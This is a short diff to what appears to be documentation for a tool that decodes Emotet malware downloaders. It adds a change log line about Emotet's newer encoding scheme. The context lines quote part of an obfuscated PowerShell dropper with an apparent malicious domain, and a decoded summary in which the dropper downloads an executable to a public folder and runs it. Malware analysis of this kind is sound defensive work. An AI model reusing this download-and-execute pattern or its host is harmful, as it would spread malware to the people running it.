@@ -64,3 +64,5 @@ ricajoy.com/wef346645'.Split(',');$karapas = $nsadasd.next(1, 343245);$huas = $e
 3. [System.Net.WebClient.DownloadFile] Save downloaded file to: C:\Users\Public\92672.exe
 4. [Invoke-Item] Execute/Open: C:\Users\Public\92672.exe
 ```
+# Change Log
+* 2018.03.20 - updated script to account for changes made to newest version of Emotet's encoding scheme
